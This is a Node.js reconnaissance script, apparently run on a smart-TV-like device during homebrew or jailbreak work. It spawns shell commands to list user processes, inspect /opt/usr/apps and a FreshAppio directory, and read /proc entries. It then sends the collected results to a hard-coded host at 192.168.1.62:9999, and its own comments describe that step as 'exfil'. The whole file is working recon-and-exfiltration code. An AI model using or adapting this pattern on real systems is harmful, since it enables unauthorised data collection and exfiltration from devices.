"use strict";
/* p37: user-space processes + /opt/usr/apps state
   - ps user (senza kernel threads)
   - grep Fresh/FreeMyTV/xvvl in ps
   - /opt/usr/apps: ls + FreshAppio dir
   - exfil /p37info
*/
var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p37', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(60000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 120000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p37info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  timeoutMs = timeoutMs || 20000;
  return new Promise(function (resolve) {
    if (!cp) { resolve('[no child_process]'); return; }
    var out = '', err = '', done = false;
    var child;
    try { child = cp.spawn('sh', ['-c', cmd], { stdio: ['ignore', 'pipe', 'pipe'] }); }
    catch (e) { resolve('[spawn err ' + e + ']'); return; }
    var t = setTimeout(function () {
      if (done) return; done = true;
      try { child.kill('SIGKILL'); } catch (e) {}
      resolve('[timeout ' + timeoutMs + '] ' + (out || err).substring(0, 8000));
    }, timeoutMs);
    child.stdout.on('data', function (d) { out += d.toString(); });
    child.stderr.on('data', function (d) { err += d.toString(); });
    child.on('close', function (code) {
      if (done) return; done = true; clearTimeout(t);
      var s = (out || err);
      if (code !== 0) s = '[exit ' + code + '] ' + s;
      resolve(s.substring(0, 9000));
    });
    child.on('error', function (e) {
      if (done) return; done = true; clearTimeout(t);
      resolve('[err ' + e.message + ']');
    });
  });
}

function seq(steps) {
  var i = 0;
  function next() {
    if (i >= steps.length) { postFinal(); return; }
    var s = steps[i++];
    s.fn().then(function (r) {
      R.results[s.name] = r;
      next();
    }).catch(function (e) {
      R.results[s.name] = '[exception ' + e + ']';
      next();
    });
  }
  next();
}

var steps = [
  { name: 'ps_user', fn: function () { return run('ps -ef 2>/dev/null | grep -v "kthreadd" | tail -150', 25000); } },
  { name: 'ps_apps', fn: function () { return run('ps -ef 2>/dev/null | grep -iE "Fresh|FreeMyTV|xvvl|apps_rw|/opt/usr/apps" | grep -v grep', 25000); } },
  { name: 'optusr_apps_ls', fn: function () { return run('ls -la /opt/usr/apps/ 2>&1 | grep -iE "fresh|FreeMyTV|xvvl|total|^d" | head -30', 15000); } },
  { name: 'freshappio_dir', fn: function () { return run('ls -laR /opt/usr/apps/FreshAppio 2>&1 | head -40', 15000); } },
  { name: 'parent_327', fn: function () { return run('cat /proc/327/comm 2>/dev/null; echo; cat /proc/327/cmdline 2>/dev/null | tr "\\0" " "; echo', 10000); } }
];

seq(steps);

setTimeout(function () { R.results.guard = 'global timeout'; postFinal(); }, 150000);
